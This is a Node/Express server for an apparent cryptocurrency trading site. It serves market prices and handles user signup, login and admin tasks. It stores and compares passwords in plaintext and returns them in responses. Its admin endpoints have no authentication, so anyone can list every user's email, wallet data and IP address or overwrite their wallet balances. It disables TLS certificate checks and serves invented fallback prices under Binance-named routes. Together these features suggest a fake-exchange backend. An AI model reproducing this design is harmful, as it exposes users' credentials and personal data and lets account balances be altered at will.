import express from 'express';
import cors from 'cors';
import pg from 'pg';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 5001;
const { Pool } = pg;

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

app.use(cors());
app.use(express.json());

// ASSET_ID_MAP for CoinCap
const ASSET_ID_MAP = {
    'BTC': 'bitcoin', 'ETH': 'ethereum', 'SOL': 'solana', 'DOT': 'polkadot',
    'USDT': 'tether', 'BNB': 'binance-coin', 'XRP': 'xrp', 'ADA': 'cardano',
    'DOGE': 'dogecoin', 'MATIC': 'polygon', 'AVAX': 'avalanche',
    'LINK': 'chainlink', 'KSM': 'kusama'
};

// Database Initialization
pool.query(`
  CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    wallet_data JSONB DEFAULT '{}'::jsonb,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address TEXT
  );
`).catch(console.error);

// API: Market Prices (with mock fallback if fetch fails)
app.get('/api/binance/prices', async (req, res) => {
  try {
    const response = await fetch('https://api.coincap.io/v2/assets?limit=100');
    if (response.ok) {
      const data = await response.json();
      const mapped = data.data.map(asset => ({
        symbol: `${asset.symbol}USDT`,
        lastPrice: asset.priceUsd,
        priceChangePercent: asset.changePercent24Hr
      }));
      return res.json(mapped);
    }
  } catch (e) {
    console.error('Price fetch error:', e.message);
  }
  // Mock fallback for UI stability
  res.json([
    { symbol: 'BTCUSDT', lastPrice: '82929.94', priceChangePercent: '1.45' },
    { symbol: 'ETHUSDT', lastPrice: '2950.12', priceChangePercent: '0.85' },
    { symbol: 'SOLUSDT', lastPrice: '168.45', priceChangePercent: '4.12' }
  ]);
});

// API: Klines
app.get('/api/binance/klines', async (req, res) => {
  try {
    const { symbol } = req.query;
    const symbolStr = typeof symbol === 'string' ? symbol : 'BTCUSDT';
    const id = ASSET_ID_MAP[symbolStr.replace('USDT', '')] || 'bitcoin';
    const response = await fetch(`https://api.coincap.io/v2/assets/${id}/history?interval=m15`);
    const data = await response.json();
    // Sort ascending by time to prevent Lightweight Charts errors
    const klines = data.data
      .map(d => [parseInt(d.time), d.priceUsd, d.priceUsd, d.priceUsd, d.priceUsd, "0", parseInt(d.time) + 900000])
      .sort((a, b) => a[0] - b[0]);
    return res.json(klines);
  } catch (error) {
    const now = Math.floor(Date.now() / 1000) * 1000;
    const mockKlines = Array.from({length: 20}, (_, i) => [
      now - ((20 - i) * 900000), 
      "80000", "81000", "79000", "80500", "0", 
      now - ((20 - i) * 900000) + 900000
    ]);
    res.json(mockKlines);
  }
});

// API: Auth
app.post('/api/auth/signup', async (req, res) => {
  const { email, password, walletData } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  try {
    const result = await pool.query(
      'INSERT INTO users (email, password, wallet_data, ip_address) VALUES ($1, $2, $3, $4) RETURNING *',
      [email, password, JSON.stringify(walletData), ip]
    );
    res.json({ success: true, user: result.rows[0] });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  try {
    const result = await pool.query(
      'UPDATE users SET last_seen = CURRENT_TIMESTAMP, ip_address = $1 WHERE email = $2 AND password = $3 RETURNING *',
      [ip, email, password]
    );
    if (result.rows.length > 0) res.json({ success: true, user: result.rows[0] });
    else res.status(401).json({ success: false, error: 'Invalid credentials' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/admin/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, email, wallet_data, last_seen, ip_address FROM users ORDER BY last_seen DESC NULLS LAST');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/admin/users/update', async (req, res) => {
  const { id, wallet_data } = req.body;
  try {
    await pool.query('UPDATE users SET wallet_data = $1 WHERE id = $2', [JSON.stringify(wallet_data), id]);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(port, '0.0.0.0', () => {
  console.log(`API Server running on port ${port}`);
});
